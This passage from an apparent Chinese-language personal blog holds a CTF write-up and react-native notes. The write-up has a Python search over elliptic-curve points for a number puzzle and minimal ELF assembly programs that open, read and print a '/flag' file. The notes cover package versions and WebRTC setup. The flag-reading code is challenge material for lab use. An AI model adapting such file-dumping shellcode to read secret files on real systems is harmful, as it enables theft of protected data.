class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment">#print(a/(b+c)+b/(a+c)+c/(a+b),N)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ff</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">3</span> + aa*x + bb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">xp,yp,xq,yq</span>):</span><br><span class="line">    <span class="comment">#xp += a/3</span></span><br><span class="line">    <span class="comment">#xq += a/3</span></span><br><span class="line">    <span class="comment">#print(yp**2,ff(xp))</span></span><br><span class="line">    <span class="keyword">if</span> xp == xq <span class="keyword">and</span> yq == yp:</span><br><span class="line">        lm = (<span class="number">3</span>*xp**<span class="number">2</span>+aa)/(<span class="number">2</span>*yp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lm = (yp-yq)/(xp-xq)</span><br><span class="line">    xr = lm**<span class="number">2</span>-xp-xq</span><br><span class="line">    yr = lm*(xp-xr)-yp</span><br><span class="line">    <span class="comment">#print(yr**2,ff(xr),f(xr-a/3))</span></span><br><span class="line">    <span class="comment">#print(type(xr))</span></span><br><span class="line">    <span class="keyword">return</span> xr,yr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">3</span> + a*x**<span class="number">2</span>+b*x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">x,y</span>):</span><br><span class="line">    x = Fraction(<span class="built_in">int</span>(x),<span class="number">1</span>)</span><br><span class="line">    y = Fraction(<span class="built_in">int</span>(y),<span class="number">1</span>)</span><br><span class="line">    x += a/<span class="number">3</span></span><br><span class="line">    <span class="comment">#print(check(geta(x,y),getb(x,y),getc(x,y)))</span></span><br><span class="line">    xr,yr = add(x,y,x,y)</span><br><span class="line">    check(geta(xr-a/<span class="number">3</span>,yr),getb(xr-a/<span class="number">3</span>,yr),getc(xr-a/<span class="number">3</span>,yr))</span><br><span class="line">    <span class="comment">#print(xr-a/3,yr)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        xrr,yrr = add(x,y,xr,yr)</span><br><span class="line">        <span class="keyword">if</span> check(geta(xrr-a/<span class="number">3</span>,yrr),getb(xrr-a/<span class="number">3</span>,yrr),getc(xrr-a/<span class="number">3</span>,yrr)):</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment">#x,y = xr,yr</span></span><br><span class="line">        xr,yr = xrr,yrr</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">20000</span>,<span class="number">20000</span>):</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    fx = f(x)</span><br><span class="line">    <span class="keyword">if</span> fx &lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    y,flag = gmpy2.iroot(<span class="built_in">int</span>(fx),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#solve(x,y)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> solve(x,y):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">N=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-100 260</span><br><span class="line">N=4</span><br><span class="line">a=154476802108746166441951315019919837485664325669565431700026634898253202035277999</span><br><span class="line">b=36875131794129999827197811565225474825492979968971970996283137471637224634055579</span><br><span class="line">c=4373612677928697257861252602371390152816537558161613618621437993378423467772036</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-200 680</span><br><span class="line">N=6</span><br><span class="line">a=20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557</span><br><span class="line">b=2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447</span><br><span class="line">c=1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 10</span><br><span class="line">a=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</span><br><span class="line">b=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</span><br><span class="line">c=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 12</span><br><span class="line">a=9771648423124723726177348367579036940996321519493182113688185913291912152167430962940286713704689291955030766917703582615167560632692208569350596318361971945750539077074921376878141735974825044184065325295542414690299404543957471585986271492883344336895444628417764598798059282135540264079530839334683089479387712689664348829803188436456581110658900633423526039703131197080466706425129542338489808063522607588342584200312382147588021744331992391832435570655076979943362024164159108464336717094994098309362464023676446199308737155163873551701208488828402974721390557367029987977855707022545910750122799634001172374761109175036019323234546383998982432217361050210984517599581577248801341849448303544088176264625811806142770294209982442408662519374761728070223714521821341117002331986498770555184073085027058095297336167677439607364510657437509486347967307803660171207058735567136463940112222314297317750700776624058908857471453427988612985064899673716630236456014245800912222319599696269373722466085725674157804399937147349826725426492477399825189629059858143754233366556058143229760327782450544023555022700607812759157576200327040510464661565706996737315846564795178593069240330781574428355212732623725876985598328229189126427627014915844367895005634186488060123351425224254658993594181034585580728472926584634345281045130880900933874051988840549119158099281094622771545146573280290125472471508524146960616613046094502775760354004277755376103461683156447272164405834240309654181339266066263159088013664792412947782580562302145769970189263032100245853943329981223091010635294626858575635181685165656502546698206083122664124915608202069269724379843842840589157695219270750118704026028654165401285548616906593019632882729540612247917655897119373938582993296569576361174642805599263009865424731023686421547614323517551093776435182182140089430393766501364362547924371223967349402455455441526984962551991999740939806598094829176294395288025415862487224690038784444479146323714873578973543339383804639812551447024169760867016277652364254017342569664821765700133711906605529500370028326735684760029880824589496327934929890451806466028722732111707352281105526352585578795270682734602251672860466286137618451728577222436372703708755203706276857915607877115578246058172188790243120058005406354006933249427269186026037719060025838643524816124535097800306551506659235785757708355416892809830706818987658005883960242994520660422766140515613930376253008301505691252247843497900812092131062228821968787255843774769294070526791658638255579065403517667805443531566516803268415382062088531458623037511041673490301151134361350520723131052983435925526212885827536368956540475248756348725668932765463359607076032536135984411047176832817954294834358117678876487728677844675188893304999714929142496108422125998795771469689592410179339895441001807800777244298595113076411858026767080234245436677391556512837521159681035996524381164562299217240816526864051747417996965408494564793876350006434149310494879345252225512207327377641046172449349234814800370542810062964918653675533999879633796275182294288725302482565574689774236243367061493493871378478841132541150327804822340923534374347417734327962641422485698737250906970866594251938717273245180046336357159717643987207108520200884860052166562771159345328326046425986193537383085182662821369601389344051970598825589841391881179369502441</span><br><span class="line">b=355278342530640706599407170519248057086229224524520519157141107708508537777205114284836515916647281859247795539514644616851559754279314555875406812187972064036035557571299859907280810487149605334993350531002451299724364967645584709273394386591591195780391447196683330849598560271745701404034625131501993929419554266148290436679685445363131010836932629342154128643351678951282983749890989559890172019099261175094354121592456388228285392695032585171051639572467407610797751366649496928321845783437550911111047278383580607079737332894364303410021661677697214580427323420620970187098111338585040445789178378027622721085136875173221486668228434792389270646253382261057411216813326434321501013051997430441500004490156606094833372922100067917450173462555720881102457821630342749340867365008072441643478548721857292917452800697091436767776083635027373005756786010659444917124676112164411021940883874460477540417603487387574930026382803252605451761123854779624051422486933911811669680548762039750465949397184413613720601642705976126017892620552601501858263828583840887458987486197543156013041348847816031608699049912936308450819095510369701575578097250363368454461945148450576088433249713999167088458370351492130049783151127247370858531196993379176146118278989362781036431924069823925694605248692612491891011456236063305446307145213155963155713254947146969705707871047748827652962063454148762245165952045524839856938394353277318602286742502902467957014204949461972627441403014827123154496446151973383417479788921710173738381531711188367127686337683922337834803729129860547622394303860359090631322192199105383221995196638722101561512713080014557011603612235554087760232042126289412640004429367002342732510653670491385158696739998435013535332649487741680965013588417081164473304832663472222330032194673510586568514566505918964524054367862236706513657705601280209392824784214794388906944781256335282029618881491665550233021568492161644797572375050841378822048811169837099457416172794125347941123267556933505091898801954097367551330470039516528938002060368203771887848789933865049084996127893937024390453874088559156599250770154698773410485652163460604146736536998704744308747694562472589990594315082773213352567913224257883617970694009815571365310386133474806148114386493590025948707911857605911663465773207882473351193724108758290123955278061608587631862670149052118711701158527145181175190875795882098138836322507020482823700475885261298942438375141523097467136949344549146226783627312473680145737634678721649048185277680609630836890634565927029420985039606240188037856013124138575514784612402632326680678385133078122001191529488632864949389691396850211361741599166067293474086420940368406413602811300967477515893863371822747402011882565685406820752393426871334343726588669248706316761007252201944198166289444499842118193477939440518068080562630698421649307162223651191249634030063115515307507458592025473811290000412080019218175657190077848458901960552364736984977562980489155298839168694740209782414540433384032643432411675316990421342815443209738155863833108803588186058559389830125622362622871909735505714741871915567556115574951697169999420730845094742737430840794283524289288407229358051139188774198818399680388413331802255608133294263528032850298389448639132253320503425433048688168649080671114897526452528795785075258192344501895197396313877737618743144143311361</span><br><span class="line">c=20035885316890023606830534495067252147691357652057772449634307305904187410990992558920956548259424273157355393196003732013539899362716100216100574234193461987992270496600195300035752479460516954902069442618504792465804770124967301970678978328799586707754521255514483172028191260188475400317446571436004845998985653096037624624322281748829779447176083968674969833631184023187122343557933419142060815193896987871898527455938239633288396733679352394480370944272017028820473119804801589995735129329783435030364346676954726243545810431065584725705747425285116415098270756170854793527738400748018356825870940359453012877584220232457239486868961160286561107075730870191541707907024801190678872428378869070743156118725466561031241711673504710114636631852382374234153002593815839905362438349777252361649553219532495089010852188819251924513393843140092077472310502164724666534953510429204661960760251076825195012089967164704751956545716713621200138891509373146662781427659132869096244223556723315169600948861332954354413695888139017122816338494980502776971525437417811441688700350703763215954037112632057856459110596088774179908693660103919027798842365141387313347532358053282282310316931481842456257180432996840651935591189065259608213860227670186727338535935419000104738195984938003074607151510868080842855420074387493775652849570582238533035000592730676469385254313682643506004770455623730437382781957476292884741268313376108166969374162736157947254538709529590451732215030394607575401311261495611074569827532998121985392068544149777898463913810868539866423391561166029673154931578514570213744634449182859448121221325492409874400969111705041715153435314453329592896445669394904690642194906508672813178927078506631317053598793270180912538514259578229993791104172792725314850021809824960706011811171135997354162296978832638498179879771698379520095937384178635037528330099466818183983444951307338720807542182935366038924920803039824818978210615772435040781173000522957795318935743355256682046477991218402526418808672933986788522397056643264167847014634860127505194733579174334258294520958784673856708467904118326279768028815946419189313676293061904510582604099208908846437914476479234000943244508656493406134426802932798305615095458701786048985034479492729357877345432656822502309506336155060754833509042934673647393543153071076853125875966535409760468353908956772073598404677550786987821584368329022155627837041395034568285609452470732829555582976579267394284928019500640977457130634550711478008433495429299640611555109171351069880574540503991840730805473241840138226375586949924647467718787261507459412537764703036454930376493490948212829487213980710738206430842478425877099783023977823272528573428967147461248519564018755183647327105058234798276539268716600710944282509505534186050000996976904596307571400703851012188753774844974808960378596634959429569386969879801494409815032125990390725960817685563429841025885365323217522340255134111238995153536146711806678993879340908664992009441435660169161976982012130533343179316942599654407053716666680671913105456952462060978938905812334117338345608406493320504708189703699696962739031333121998774598083769292025442530856763493460673394201872178090312059357744194235029914560026838488336959743500520432584396018821068625402593286299143852751101612713576613521611747957521749921921568265523624185276246164078350540463107124</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N=14</span><br><span class="line">a=87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</span><br><span class="line">b=1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157</span><br><span class="line">c=35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767</span><br></pre></td></tr></table></figure>




<h3 id="Tiny-ELF"><a href="#Tiny-ELF" class="headerlink" title="Tiny ELF"></a>Tiny ELF</h3><p>手写汇编 3个syscall 不过似乎32bit比64bit更剩空间一点<br><a target="_blank" rel="noopener" href="https://www.ngui.cc/el/639055.html?action=onClick">https://www.ngui.cc/el/639055.html?action=onClick</a><br>应该是下面这个 记不清了（下面有80bytes的版本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.section .bss</span><br><span class="line">.equ bufSIZE, 65535</span><br><span class="line">.comm buf, bufSIZE</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.LC0:</span><br><span class="line">	.string &quot;/flag&quot;</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:	movl $2,%eax</span><br><span class="line">	leaq	.LC0(%rip),%rdi</span><br><span class="line">	//movq	$0,%rsi</span><br><span class="line">	syscall</span><br><span class="line">	mov 	%eax,%edi</span><br><span class="line">	leaq	-80(%rsp),%rsi</span><br><span class="line">	mov 	$32,%dx</span><br><span class="line">	xor 	%eax,%eax</span><br><span class="line">	syscall</span><br><span class="line">	movq    $1,%rdi</span><br><span class="line">	mov 	$1,%rax</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">mov $0x3c, %eax</span><br><span class="line">mov $42, %edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<h3 id="Teensy-ELF"><a href="#Teensy-ELF" class="headerlink" title="Teensy ELF"></a>Teensy ELF</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html">https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html</a><br>不太懂具体原因 详细看elf文件格式可能得花很多时间 这里直接参考文章作者修改版和原版的对比尝试构造<br>一些可以优化的地方：</p>
<ul>
<li>fd的0 1 2分别对应stdin stdout stderr 所以新开的文件fd一定是3 write的系统调用号也是3 省去一次赋值</li>
<li>open不需要第三个参数 可以提前把write的第三个参数值传好</li>
<li>寄存器默认是0 都不用设置</li>
<li>mov常数占用字节太多 用xor清空加inc dec等指令</li>
</ul>
<p>最后正好80bytes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">;nasm -f bin -o tiny4.out tiny4.asm</span><br><span class="line">  BITS 32</span><br><span class="line"></span><br><span class="line">	        org     0x00010000</span><br><span class="line"></span><br><span class="line">	        db      0x7F, &quot;ELF&quot;             ; e_ident</span><br><span class="line">	        dd      1                                       ; p_type</span><br><span class="line">	        dd      0                                       ; p_offset</span><br><span class="line">	        dd      $$                                      ; p_vaddr</span><br><span class="line">	        dw      2                       ; e_type        ; p_paddr</span><br><span class="line">	        dw      3                       ; e_machine</span><br><span class="line">	        dd      _start                  ; e_version     ; p_filesz</span><br><span class="line">	        dd      _start                  ; e_entry       ; p_memsz</span><br><span class="line">	        dd      4                       ; e_phoff       ; p_flags</span><br><span class="line"></span><br><span class="line">  _start:</span><br><span class="line">	        mov ebx,esp</span><br><span class="line">            mov dl,0x20</span><br><span class="line">            ; xor     eax,eax</span><br><span class="line">	        ; xor     ecx,ecx   ; str len       ; e_flags</span><br><span class="line">	        mov     al, 5   ; sys_write(fd, addr, len) : ebx, ecx, edx</span><br><span class="line">	        jmp     _next   ; jump to next part of the code</span><br><span class="line">	        dw      0x33                      ; e_ehsize</span><br><span class="line">	        dw      0x20                      ; e_phentsize</span><br><span class="line">	        dw      1                         ; e_phnum</span><br><span class="line">  _next:        </span><br><span class="line">            mov [esp],DWORD &#x27;/fla&#x27;</span><br><span class="line">            mov [esp+4], WORD 0x0067</span><br><span class="line">            int     0x80    ; syscall         ; e_shentsize</span><br><span class="line">            mov ebx,eax</span><br><span class="line">            mov ecx,esp</span><br><span class="line">            ; mov edx,0x20</span><br><span class="line">			int 0x80</span><br><span class="line">			mov     al, 4</span><br><span class="line">            dec ebx</span><br><span class="line">            dec ebx</span><br><span class="line">			int 0x80</span><br><span class="line"></span><br><span class="line">            mov bl,42</span><br><span class="line">	        mov     al, 1   ; eax=1,sys_exit  ; e_shnum</span><br><span class="line">	        int     0x80    ; syscall         ; e_shstrndx</span><br><span class="line"></span><br><span class="line">  filesize      equ     $ - $$</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/misc/react-native-note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/misc/react-native-note/" class="post-title-link" itemprop="url">react-native 开发记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:46:58 / Modified: 20:49:52" itemprop="dateCreated datePublished" datetime="2024-01-22T20:46:58+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>3.6k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>13 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="react-native-开发记录"><a href="#react-native-开发记录" class="headerlink" title="react-native 开发记录"></a>react-native 开发记录</h1><h2 id="react-native-项目配置"><a href="#react-native-项目配置" class="headerlink" title="react-native 项目配置"></a>react-native 项目配置</h2><ul>
<li><p>最新版0.68 要求jdk11 互联网课装好的是jdk8 所以使用0.66.4</p>
<p>用intellij自动生成是最新版的，降级：</p>
</li>
</ul>
<p><code>npm install --save react-native@0.66.4</code></p>
<ul>
<li><p>用intellij自动生成的 跑不了 会报少文件 用官网说的命令行方式新建项目<code>npx react-native init Project --version 0.66.4</code></p>
<p>然而用命令行新建的项目再用intellij打开并不能识别 所以用vscode</p>
</li>
<li><p>安卓模拟器配置：<a target="_blank" rel="noopener" href="https://reactnative.dev/docs/environment-setup">https://reactnative.dev/docs/environment-setup</a></p>
</li>
<li><p>编译运行：<code>npx react-native run-android</code> (用vscode可以终端-运行任务)</p>
</li>
<li><p>打包发给手机：(android目录下)<code>gradlew assembleRelease</code></p>
<p>apk路径：Project\android\app\build\outputs\apk\release</p>
</li>
<li><p>ios不像安卓这么容易，必须用Xcode，而Xcode又必须是mac环境</p>
</li>
</ul>
<h2 id="package"><a href="#package" class="headerlink" title="package"></a>package</h2><p>包有互相依赖关系<br><code>npm install --legacy-peer-deps</code> 避免报错</p>
<h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;@react-navigation/native&quot;: &quot;^6.0.10&quot;,</span><br><span class="line">&quot;@react-navigation/stack&quot;: &quot;^6.2.1&quot;,</span><br></pre></td></tr></table></figure>
<p>有如下依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;react-native-gesture-handler&quot;: &quot;^2.5.0&quot;,</span><br><span class="line">&quot;react-native-safe-area-context&quot;: &quot;^4.3.1&quot;,</span><br><span class="line">&quot;react-native-safe-area-view&quot;: &quot;^1.1.1&quot;,</span><br><span class="line">&quot;react-native-screens&quot;: &quot;3.13.1&quot;</span><br></pre></td></tr></table></figure>
<h3 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h3><p><code>&quot;@react-native-community/async-storage&quot;: &quot;^1.12.1&quot;</code></p>
<h3 id="antd"><a href="#antd" class="headerlink" title="antd"></a>antd</h3><p>antd-mobile不支持react native 换一个支持的</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ant-design/ant-design-mobile-rn">https://github.com/ant-design/ant-design-mobile-rn</a></p>
<p><a target="_blank" rel="noopener" href="https://rn.mobile.ant.design/">https://rn.mobile.ant.design/</a></p>
<p><code>&quot;@ant-design/react-native&quot;: &quot;5.0.0&quot;</code></p>
<p>依赖包(issue中发现)<br><code>npm install classnames rc-util fbjs</code></p>
<p>但实际上移动端的antd实现的组件并不如web端那么丰富，很多时候react-native自带的组件已经挺不错了</p>
<h3 id="webrtc"><a href="#webrtc" class="headerlink" title="webrtc"></a>webrtc</h3><p><a target="_blank" rel="noopener" href="https://github.com/react-native-webrtc/react-native-webrtc">https://github.com/react-native-webrtc/react-native-webrtc</a></p>
<p>下这个包会很慢，需要耐心等</p>
<p>启动有问题，不报任何错误 在issue中找到解决方法，修改安卓文件配置即可</p>
<p><a target="_blank" rel="noopener" href="https://github.com/react-native-webrtc/react-native-webrtc/issues/1080">https://github.com/react-native-webrtc/react-native-webrtc/issues/1080</a></p>
<p>针对安卓的权限问题解决如下</p>
<p><a target="_blank" rel="noopener" href="https://github.com/react-native-webrtc/react-native-webrtc/blob/master/Documentation/AndroidInstallation.md">https://github.com/react-native-webrtc/react-native-webrtc/blob/master/Documentation/AndroidInstallation.md</a></p>
<h3 id="simple-peer"><a href="#simple-peer" class="headerlink" title="simple peer"></a>simple peer</h3><p><a target="_blank" rel="noopener" href="https://github.com/feross/simple-peer">https://github.com/feross/simple-peer</a></p>
<p>simple-peer并没有说是支持移动端的，但是可以根据如下方法直接使用<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66281342/simple-peer-with-react-native-webrtc">https://stackoverflow.com/questions/66281342/simple-peer-with-react-native-webrtc</a></p>
<p>遇到的问题在于，react-native-webrtc中的RTCPeerConnection还没有实现很多API，因此在使用的时候会直接报错。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/react-native-webrtc/react-native-webrtc/pull/1160">https://github.com/react-native-webrtc/react-native-webrtc/pull/1160</a><br>此PR增加API 但仍在开发中</p>
<p>若此后遇到问题，可尝试更换框架为peerjs</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Zemke/react-native-peerjs">https://github.com/Zemke/react-native-peerjs</a></p>
<p><a target="_blank" rel="noopener" href="https://peerjs.com/docs/#api">https://peerjs.com/docs/#api</a></p>
